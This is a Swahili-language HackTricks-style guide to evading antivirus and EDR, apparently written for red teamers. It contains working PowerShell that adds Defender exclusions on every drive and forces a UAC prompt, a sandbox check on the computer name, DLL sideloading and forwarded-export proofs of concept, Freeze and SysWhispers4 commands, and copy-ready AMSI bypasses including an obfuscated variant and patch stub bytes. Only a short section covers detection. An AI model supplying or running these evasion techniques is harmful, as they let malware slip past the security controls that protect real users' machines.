# Kupita Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa awali na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Simamisha Defender

- [defendnot](https://github.com/es3n1n/defendnot): Zana ya kusimamisha Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Zana ya kusimamisha Windows Defender kufanya kazi kwa kujifanya AV nyingine.
- [Zima Defender ikiwa wewe ni admin](basic-powershell-for-pentesters/README.md)

### Kisingizio cha UAC cha mtindo wa installer kabla ya kuingilia Defender

Loaders za umma zinazojifanya cheats za michezo mara nyingi husambazwa kama installers za Node.js/Nexe zisizosainiwa, ambazo kwanza **humwomba mtumiaji ruhusa za juu** kisha tu kuzima Defender. Mchakato ni rahisi:

1. Chunguza kama kuna muktadha wa kiutawala kwa kutumia `net session`. Amri hii hufaulu tu mtumiaji anapokuwa na haki za admin, kwa hivyo ikishindwa inaashiria kuwa loader inaendeshwa na mtumiaji wa kawaida.
2. Iwashe upya mara moja kwa kutumia kitenzi cha `RunAs` ili kuanzisha ombi linalotarajiwa la idhini ya UAC huku ukihifadhi command line ya awali.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Waathiriwa tayari wanaamini kuwa wanasakinisha software “iliyopasuliwa”, kwa hivyo kwa kawaida wanakubali kidokezo hicho, na hivyo kuipa malware ruhusa inazohitaji ili kubadilisha sera ya Defender.<sup>[[26]](#references)</sup>

### Exclusions za `MpPreference` za jumla kwa kila herufi ya drive

Baada ya kupata ruhusa za juu, minyororo ya aina ya GachiLoader huongeza maeneo ambayo Defender haiwezi kuona badala ya kuzima huduma moja kwa moja. Loader huua kwanza GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) kisha huweka **exclusions pana mno** ili kila wasifu wa mtumiaji, saraka ya mfumo na diski inayoweza kutolewa isiweze kuchanganuliwa:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Mambo muhimu yaliyoonekana:

- Mzunguko huu hupitia kila mfumo wa faili uliowekwa (D:\, E:\, vijiti vya USB, n.k.), kwa hiyo **payload yoyote itakayowekwa baadaye popote kwenye diski itapuuzwa**.
- Kizuizi cha kiendelezi `.sys` kimewekwa kwa ajili ya siku zijazo—washambuliaji wanahifadhi chaguo la kupakia drivers zisizosainiwa baadaye bila kuhitaji kugusa Defender tena.
- Mabadiliko yote huhifadhiwa chini ya `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, hivyo hatua zinazofuata zinaweza kuthibitisha kuwa vighairi hivyo bado vipo au kuvipanua bila kusababisha UAC tena.

Kwa kuwa hakuna huduma ya Defender inayositishwa, ukaguzi wa kawaida wa afya ya mfumo bado huripoti kuwa “antivirus inafanya kazi” ingawa ukaguzi wa wakati halisi haukagui kabisa njia hizo.<sup>[[26]](#references)</sup>

## **Mbinu za AV Evasion**

Kwa sasa, AV hutumia mbinu tofauti kubaini kama faili ni hasidi au la: utambuzi tuli, uchanganuzi wa nguvu na, kwa EDR za kisasa zaidi, uchanganuzi wa tabia.

### **Utambuzi tuli**

Utambuzi tuli hufanywa kwa kutambua mfuatano wa herufi hasidi unaojulikana au safu za baiti katika binary au script, na pia kutoa taarifa kutoka kwenye faili yenyewe (kwa mfano, maelezo ya faili, jina la kampuni, sahihi za dijitali, ikoni, checksum, n.k.). Hii inamaanisha kuwa kutumia zana za umma zinazojulikana kunaweza kufanya ugundulike kwa urahisi zaidi, kwa kuwa huenda tayari zimechanganuliwa na kuwekewa alama ya kuwa hasidi. Kuna njia kadhaa za kukwepa aina hii ya utambuzi:

- **Usimbaji fiche**

Ukisimba binary kwa njia fiche, AV haitaweza kugundua programu yako, lakini utahitaji aina fulani ya loader ili kuifungua na kuiendesha kwenye memory.

- **Kuficha msimbo**

Wakati mwingine unachohitaji ni kubadilisha baadhi ya mifuatano ya herufi kwenye binary au script yako ili ipite AV, lakini hili linaweza kuchukua muda kutegemea unachojaribu kuficha.

- **Kutengeneza zana maalum**

Ukitengeneza zana zako mwenyewe, hakutakuwa na signature mbaya zinazojulikana, lakini hili huchukua muda na juhudi nyingi.

> [!TIP]
> Njia nzuri ya kuangalia utambuzi tuli wa Windows Defender ni kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi hugawanya faili katika sehemu kadhaa kisha huiambia Defender ichanganue kila sehemu kivyake; kwa njia hii, inaweza kukuonyesha hasa mifuatano ya herufi au baiti zilizo kwenye binary yako na kuwekewa alama.

Ninapendekeza sana uangalie [orodha hii ya video za YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu AV Evasion ya vitendo.

### Majaribio ya vipengele vya PE bila mtandao kwa viainishaji tuli

Baiti za payload zilizofungwa au kusimbwa kwa njia fiche ni mojawapo tu ya pembejeo za kiainishaji tuli. EMBER2024 hutoa vipengele vya PE, vikiwemo imports, exports, sections, headers na data ya Authenticode.<sup>[[48]](#references)</sup> Katika jaribio moja la loader, kuongeza imports 141 zilizoonekana kuwa zisizo na madhara kulipunguza alama ya uovu ya EMBER2024 kwa 93%, huku imports zinazohusishwa na malware zikiiongeza. Haya ni matokeo ya modeli hiyo na sampuli hizo, si njia ya uhakika ya kukwepa bidhaa maalum ya AV/EDR.<sup>[[50]](#references)</sup>

Kwa jaribio la loader lililoidhinishwa, dumisha payload na njia ya utekelezaji bila mabadiliko, badilisha kigezo kimoja tu cha build kwa kila toleo, kisha linganisha alama bila kutumia mtandao. Kagua vipengele vya PE vinavyotokana na hilo, kwa sababu mabadiliko ya build yanaweza kuathiri zaidi ya kundi moja la vipengele.<sup>[[49]](#references)[[50]](#references)</sup> Ili imports zinazokusudiwa zibaki kwenye IAT, ita Win32 APIs zilizochaguliwa kutoka kwenye msimbo unaoweza kufikiwa. Badilisha uchaguzi na usambaze sehemu za kuita API hizo katika builds mbalimbali badala ya kuunda kitendaji kimoja kisichobadilika cha kuficha msimbo, ambacho kinaweza kuwa signature. Jaribio hilo pia liliripoti alama za chini zaidi kwa kusaini msimbo kihalali, kuongeza maingizo ya export, na kuongeza idadi ya functions zinazopanua `.pdata`; kusaini batili kulikuwa na athari ndogo, na athari ya `.pdata` ilikuwa ndogo.<sup>[[50]](#references)</sup>

Kifurushi cha `thrember` hutoa uchimbaji wa vipengele na modeli za ulinganishaji. Baada ya kukisakinisha, tumia `thrember.download_models("models")` ukiwa na directory ya `models` iliyopo, kisha endesha scorer kutoka kwenye directory yake ya mzazi: helper ya kupakua hubadilisha directory ya sasa ya kufanya kazi. Kiainishaji cha PE kinaweza kukokotoa alama za directory yenye builds bila kuziwasilisha kwenye huduma ya uchanganuzi:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Weka matoleo ya model na feature-extractor bila kuyabadilisha wakati wa ulinganisho. Alama ya chini kwenye offline inaonyesha tu jinsi classifier hii inavyoitikia binary iliyobadilishwa; haithibitishi kukwepa behavioral analysis, emulation, au model tofauti ya vendor.<sup>[[49]](#references)[[50]](#references)</sup> Kwa [per-build polymorphism and outer-binary camouflage in virtualized payloads](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), angalia execution model tofauti.

### **Dynamic analysis**

Dynamic analysis ni pale AV inapoendesha binary yako kwenye sandbox na kufuatilia shughuli hasidi (kwa mfano, kujaribu kusimbua na kusoma nywila za browser yako, kufanya minidump ya LSASS, n.k.). Sehemu hii inaweza kuwa ngumu zaidi kushughulikia, lakini hapa kuna mambo unayoweza kufanya ili kukwepa sandboxes.

- **Sleep kabla ya execution** Kulingana na jinsi inavyotekelezwa, hii inaweza kuwa njia nzuri ya kukwepa dynamic analysis ya AV. AV zina muda mfupi sana wa kuchanganua faili ili zisiingilie mtiririko wa kazi wa mtumiaji, kwa hiyo kutumia sleep za muda mrefu kunaweza kuvuruga uchanganuzi wa binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza kuruka sleep tu, kutegemea jinsi ilivyotekelezwa.
- **Kukagua rasilimali za mashine** Kwa kawaida, Sandboxes zina rasilimali chache sana za kutumia (kwa mfano, < 2GB RAM); vinginevyo zinaweza kupunguza kasi ya mashine ya mtumiaji. Unaweza pia kuwa mbunifu sana hapa, kwa mfano, kwa kukagua halijoto ya CPU au hata kasi ya feni; si kila kitu kitatekelezwa kwenye sandbox.
- **Ukaguzi maalum kwa mashine** Ikiwa unataka kulenga mtumiaji ambaye workstation yake imeunganishwa kwenye domain ya "contoso.local", unaweza kukagua domain ya kompyuta ili kuona kama inalingana na uliyoainisha. Isipolingana, unaweza kufanya programu yako itoke.

Imebainika kuwa computername ya Microsoft Defender's Sandbox ni HAL9TH, kwa hiyo unaweza kukagua jina la kompyuta kwenye malware yako kabla ya detonation. Jina likiwa HAL9TH, inamaanisha uko ndani ya defender's sandbox, kwa hiyo unaweza kufanya programu yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Vidokezo vingine vizuri sana kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) vya kukabiliana na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> chaneli ya #malware-dev</p></figcaption></figure>

Kama tulivyosema awali kwenye chapisho hili, **public tools** hatimaye **zitagunduliwa**, kwa hiyo unapaswa kujiuliza jambo moja:

Kwa mfano, ikiwa unataka kufanya dump ya LSASS, **unahitaji kweli kutumia mimikatz**? Au unaweza kutumia project tofauti isiyojulikana sana ambayo pia hufanya dump ya LSASS?

Huenda jibu sahihi ni la pili. Tukitumia mimikatz kama mfano, huenda ni mojawapo ya malware inayowekwa alama nyingi zaidi na AVs na EDRs, au ndiyo yenye alama nyingi zaidi. Ingawa project yenyewe ni nzuri sana, pia ni jinamizi kujaribu kuikwepa AVs, kwa hiyo tafuta tu njia mbadala za kutimiza unachojaribu kufanya.

> [!TIP]
> Unapobadilisha payloads zako ili kukwepa ugunduzi, hakikisha **unazima automatic sample submission** kwenye defender, na tafadhali, kwa dhati, **USIPAKIE KWENYE VIRUSTOTAL** ikiwa lengo lako ni kufanikisha ukwepaji wa ugunduzi kwa muda mrefu. Ikiwa unataka kuangalia kama payload yako inagunduliwa na AV fulani, isakinishe kwenye VM, jaribu kuzima automatic sample submission, kisha ijaribu humo hadi uridhike na matokeo.

## EXEs dhidi ya DLLs

Inapowezekana, **tanguliza kutumia DLLs kwa ajili ya kukwepa ugunduzi**. Kwa uzoefu wangu, faili za DLL kwa kawaida **hugunduliwa na kuchanganuliwa kwa kiwango cha chini zaidi**, kwa hiyo huu ni ujanja rahisi wa kutumia ili kuepuka ugunduzi katika baadhi ya hali (ikiwa payload yako inaweza kufanya kazi kama DLL, bila shaka).

Kama tunavyoona kwenye picha hii, DLL Payload kutoka Havoc ina detection rate ya 4/26 kwenye antiscan.me, ilhali EXE payload ina detection rate ya 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Ulinganisho wa antiscan.me kati ya Havoc EXE payload ya kawaida na Havoc DLL ya kawaida</p></figcaption></figure>

Sasa tutaonyesha ujanja kadhaa unaoweza kutumia na faili za DLL ili usionekane kirahisi zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** hutumia fursa ya mpangilio wa utafutaji wa DLL unaotumiwa na loader kwa kuweka programu lengwa na payload(s) hasidi pamoja.

Unaweza kutafuta programu zinazoweza kuathiriwa na DLL Sideloading kwa kutumia [Siofra](https://github.com/Cybereason/siofra) na script ifuatayo ya powershell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Amri hii itaonyesha orodha ya programu zilizo hatarini kwa DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana **uchunguze mwenyewe programu zinazoweza kufanyiwa DLL Hijack/Sideload**, mbinu hii ni fiche sana ikitekelezwa ipasavyo, lakini ukitumia programu za DLL Sideload zinazojulikana hadharani, unaweza kugundulika kwa urahisi.

Kuweka tu DLL hasidi yenye jina ambalo programu inatarajia kupakia hakutapakia payload yako, kwa kuwa programu inatarajia kuwe na functions maalum ndani ya DLL hiyo. Ili kurekebisha tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** huelekeza miito ambayo programu hufanya kutoka kwenye DLL ya proxy (na hasidi) kwenda kwenye DLL asili, hivyo kuhifadhi utendakazi wa programu na kuwezesha kushughulikia utekelezaji wa payload yako.

Nitatumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Amri ya mwisho itatupatia faili 2: kiolezo cha msimbo wa chanzo wa DLL, na DLL asili iliyopewa jina jipya.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Haya ndiyo matokeo:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Shellcode yetu (iliyosimbwa kwa kutumia [SGN](https://github.com/EgeBalci/sgn)) na proxy DLL zote zina kiwango cha Detection cha 0/26 kwenye [antiscan.me](https://antiscan.me)! Ningesema huo ni mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Ninapendekeza sana** utazame [video ya S3cur3Th1sSh1t ya Twitch](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [video ya ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kwa undani kuhusu tuliyojadili.

### Kutumia vibaya Forwarded Exports (ForwardSideLoading)

Windows PE modules zinaweza ku-export functions ambazo kwa hakika ni "forwarders": badala ya kuelekeza kwenye code, ingizo la export huwa na string ya ASCII ya muundo `TargetDll.TargetFunc`. Caller anapotatua export hiyo, Windows loader itafanya yafuatayo:

- Itapakia `TargetDll` ikiwa bado haijapakiwa
- Itatatua `TargetFunc` kutoka humo

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, itatolewa kutoka kwenye namespace ya KnownDLLs iliyolindwa (k.m., ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ikiwa `TargetDll` si KnownDLL, utaratibu wa kawaida wa kutafuta DLL utatumika, ambao unajumuisha saraka ya module inayofanya forward resolution.

Hii huwezesha mbinu ya indirect sideloading: tafuta DLL iliyosainiwa ambayo hu-export function inayo-forward kwenye jina la module isiyo KnownDLL, kisha iweke DLL hiyo iliyosainiwa pamoja na DLL inayodhibitiwa na mshambuliaji, ikiwa na jina linalolingana kabisa na jina la forwarded target module. Forwarded export inapoombwa, loader hutatua forward hiyo na kupakia DLL yako kutoka kwenye saraka hiyo hiyo, na kutekeleza DllMain yako.<sup>[[13]](#references)</sup>

Mfano ulioonekana kwenye Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` si KnownDLL, kwa hivyo hupatikana kwa kutumia mpangilio wa kawaida wa utafutaji.

PoC (nakili-bandika):
1) Nakili DLL ya mfumo iliyotiwa saini kwenye folda inayoweza kuandikwa na mtumiaji.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` hasidi kwenye folda hiyo hiyo. DllMain ndogo kabisa inatosha kutekeleza msimbo; huhitaji kutekeleza forwarded function ili kuanzisha DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Anzisha forward kwa kutumia LOLBin iliyotiwa saini:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Tabia iliyoonekana:
- rundll32 (iliyotiwa saini) inapakia keyiso.dll ya side-by-side (iliyotiwa saini)
- Wakati wa kutatua KeyIsoSetAuditingInterface, loader hufuata forward hadi NCRYPTPROV.SetAuditingInterface
- Kisha loader hupakia NCRYPTPROV.dll kutoka C:\test na kutekeleza DllMain yake
- Ikiwa SetAuditingInterface haijatekelezwa, utapata hitilafu ya "missing API" tu baada ya DllMain kuwa tayari imetekelezwa

Vidokezo vya kutafuta:
- Lenga forwarded exports ambapo target module si KnownDLL. KnownDLLs zimeorodheshwa chini ya HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs.
- Unaweza kuorodhesha forwarded exports kwa kutumia zana kama vile:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Angalia orodha ya Windows 11 forwarder ili kutafuta wagombea: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Mawazo ya ugunduzi/ulinzi:
- Fuatilia LOLBins (k.m., rundll32.exe) zinapopakia DLL zilizotiwa sahihi kutoka kwenye njia zisizo za mfumo, kisha kupakia non-KnownDLLs zenye jina msingi sawa kutoka kwenye saraka hiyo
- Toa tahadhari kuhusu minyororo ya michakato/moduli kama: `rundll32.exe` → `keyiso.dll` isiyo ya mfumo → `NCRYPTPROV.dll` chini ya njia ambazo watumiaji wanaweza kuandikia
- Tekeleza sera za uadilifu wa msimbo (WDAC/AppLocker) na uzuie ruhusa ya kuandika+pamoja na kutekeleza kwenye saraka za programu

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni zana ya payload ya kukwepa EDR kwa kutumia michakato iliyosimamishwa, direct syscalls na mbinu mbadala za utekelezaji`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa namna fiche.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya tu; kinachofanya kazi leo kinaweza kutambuliwa kesho, kwa hivyo usitegemee zana moja pekee. Ikiwezekana, jaribu kuunganisha mbinu nyingi za evasion.

## Direct/Indirect Syscalls & Utatuzi wa SSN (SysWhispers4)

Mara nyingi EDR huweka **user-mode inline hooks** kwenye syscall stubs za `ntdll.dll`. Ili kukwepa hooks hizo, unaweza kutengeneza syscall stubs za **direct** au **indirect** zinazopakia **SSN** (System Service Number) sahihi na kuhamia kwenye kernel mode bila kutekeleza entrypoint ya export iliyo na hook.<sup>[[32]](#references)</sup>

**Chaguo za utekelezaji:**
- **Direct (embedded)**: weka instruction ya `syscall`/`sysenter`/`SVC #0` kwenye stub iliyotengenezwa (hakuna kugusa export ya `ntdll`).
- **Indirect**: ruka hadi kwenye gadget iliyopo ya `syscall` ndani ya `ntdll` ili mpito wa kernel uonekane kana kwamba umetoka `ntdll` (inafaa kwa evasion ya heuristic); **randomized indirect** huchagua gadget kutoka kwenye kundi kwa kila call.
- **Egg-hunt**: epuka kuweka mfuatano tuli wa opcode `0F 05` kwenye diski; tafuta mfuatano wa syscall wakati wa runtime.

**Mikakati ya utatuzi wa SSN inayostahimili hooks:**
- **FreshyCalls (VA sort)**: tambua SSN kwa kupanga syscall stubs kulingana na virtual address badala ya kusoma byte za stub.
- **SyscallsFromDisk**: weka ramani ya `\KnownDlls\ntdll.dll` safi, soma SSN kutoka kwenye `.text` yake, kisha ondoa ramani (hukwepa hooks zote zilizo kwenye kumbukumbu).
- **RecycledGate**: changanya utambuzi wa SSN kwa kupanga VA na uthibitishaji wa opcode wakati stub iko safi; ikiwa imewekewa hook, tumia utambuzi wa VA.
- **HW Breakpoint**: weka DR0 kwenye instruction ya `syscall` na utumie VEH kunasa SSN kutoka `EAX` wakati wa runtime, bila kuchanganua byte zilizo na hook.

Mfano wa matumizi ya SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI iliundwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Hapo awali, AVs ziliweza kuchanganua **faili zilizo kwenye diski** pekee, kwa hiyo kama ungeweza kwa namna fulani kuendesha payloads **moja kwa moja kwenye kumbukumbu**, AV isingeweza kufanya chochote kuizuia, kwa kuwa haikuwa na mwonekano wa kutosha.

Kipengele cha AMSI kimeunganishwa kwenye vipengele hivi vya Windows.

- User Account Control, au UAC (uongezaji wa ruhusa wa EXE, COM, MSI, au usakinishaji wa ActiveX)
- PowerShell (scripts, matumizi ya mwingiliano, na tathmini ya msimbo wa nguvu)
- Windows Script Host (wscript.exe na cscript.exe)
- JavaScript na VBScript
- Macros za Office VBA

Huruhusu suluhisho za antivirus kukagua tabia ya script kwa kufichua maudhui ya script katika umbo ambalo halijasimbwa kwa njia fiche wala kufichwa.

Kuendesha `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutazalisha tahadhari ifuatayo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Angalia jinsi inavyoongeza `amsi:` kisha njia ya executable ambayo script iliendeshwa kutoka kwake; katika hali hii, powershell.exe

Hatukuweka faili yoyote kwenye diski, lakini bado tulinaswa kwenye kumbukumbu kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia **.NET 4.8**, msimbo wa C# pia hupitiwa na AMSI. Hili linaathiri hata `Assembly.Load(byte[])` inayotumika kupakia utekelezaji kwenye kumbukumbu. Ndiyo maana kutumia matoleo ya chini ya .NET (kama 4.7.2 au ya chini) kunapendekezwa kwa utekelezaji kwenye kumbukumbu ikiwa unataka kukwepa AMSI.

Kuna njia kadhaa za kukwepa AMSI:

- **Obfuscation**

Kwa kuwa AMSI hufanya kazi hasa kwa kutumia ugunduzi tuli, kurekebisha scripts unazojaribu kupakia kunaweza kuwa njia nzuri ya kukwepa ugunduzi.

Hata hivyo, AMSI inaweza kuondoa obfuscation kwenye scripts hata zikiwa na tabaka nyingi, kwa hiyo obfuscation inaweza kuwa chaguo baya kutegemea jinsi inavyofanywa. Hii hufanya kukwepa isiwe jambo la moja kwa moja. Hata hivyo, wakati mwingine unachohitaji ni kubadilisha majina machache ya vigezo na utakuwa sawa; kwa hiyo inategemea kiwango ambacho kitu kimewekewa alama.

- **AMSI Bypass**

Kwa kuwa AMSI hutekelezwa kwa kupakia DLL ndani ya mchakato wa powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuichezea kwa urahisi hata ukiwa mtumiaji asiye na ruhusa za juu. Kwa sababu ya dosari hii katika utekelezaji wa AMSI, watafiti wamegundua njia nyingi za kukwepa uchanganuzi wa AMSI.

**Kulazimisha Hitilafu**

Kulazimisha uanzishaji wa AMSI ushindwe (amsiInitFailed) kutasababisha uchanganuzi usianzishwe kwa mchakato wa sasa. Jambo hili lilifichuliwa awali na [Matt Graeber](https://twitter.com/mattifestation), na Microsoft imeunda signature ya kuzuia matumizi yake kwa upana zaidi.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Kilichohitajika tu ni mstari mmoja wa code ya PowerShell ili kufanya AMSI isiweze kutumika katika process ya sasa ya PowerShell. Bila shaka, mstari huu umetambuliwa na AMSI yenyewe, hivyo unahitaji marekebisho fulani ili kutumia mbinu hii.

Hapa kuna AMSI bypass iliyorekebishwa niliyoipata kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind, huenda hili likaripotiwa mara tu chapisho hili litakapotolewa, kwa hiyo usichapishe code ikiwa mpango wako ni kubaki bila kugunduliwa.

**Memory Patching**

Mbinu hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta anwani ya function ya "AmsiScanBuffer" katika amsi.dll (inayohusika na kuchanganua ingizo lililotolewa na mtumiaji) na kuibadilisha kwa maagizo ya kurudisha code ya E_INVALIDARG. Kwa njia hii, matokeo ya uchanganuzi halisi hurudisha 0, ambayo hutafsiriwa kama matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo zaidi.

Pia kuna mbinu nyingine nyingi zinazotumika kukwepa AMSI kwa powershell. Angalia [**ukurasa huu**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**repo hii**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili ujifunze zaidi kuzihusu.

### AMSI COM scan-pointer redirection instead of `AmsiScanBuffer` patching

Mbinu nyingine ya bypass inayofanyika ndani ya process haibadilishi entry point ya `AmsiScanBuffer`. Katika .NET loader ya 64-bit iliyoripotiwa, kitu cha AMSI COM huundwa kutoka CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` hutoa interface pointer, na slot yake ya vtable kwenye offset `0x18` hutumiwa kama lengo la mwito wa scan. Loader hubadilisha pointer asilia ya `Console.Clear()` kwa x64 stub ndogo, hubadilisha ingizo hilo la vtable kuelekeza kwenye stub kwa kutumia `VirtualProtect()`, kisha hurejesha ulinzi wa awali wa ukurasa. Upana wa pointer wa 64-bit na mpangilio wa COM unaotarajiwa ni masharti ya lazima; hii si offset ya jumla inayofaa kwa interfaces au builds zozote za AMSI. Hatua zilizoripotiwa awali ni [upakiaji wa signed AppDomainManager sidecar](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) na [RESX deserialization](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Byte za stub zilizobainika ni `41 C7 00 01 00 00 00 33 C0 C3`: zinaandika **1** kwenye result pointer katika `r8` na kurudisha **0** katika `eax`. Kwa hiyo, dai lililoripotiwa kwamba matokeo ya scan ni `AMSI_RESULT_CLEAN` (0) linachanganya thamani ya kurudisha ya `S_OK` na enum ya matokeo. Katika mpangilio wa `AMSI_RESULT` ulioandikwa, matokeo **1** ni `AMSI_RESULT_NOT_DETECTED`; bado yako chini ya kiwango cha detection.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI huanzishwa tu baada ya `amsi.dll` kupakiwa kwenye process ya sasa. Njia imara ya bypass isiyofungamana na lugha ni kuweka user-mode hook kwenye `ntdll!LdrLoadDll` ambayo hurudisha hitilafu wakati module inayoombwa ni `amsi.dll`. Kwa hiyo, AMSI haipakiwi kamwe na hakuna scan inayofanyika kwa process hiyo.<sup>[[23]](#references)</sup>

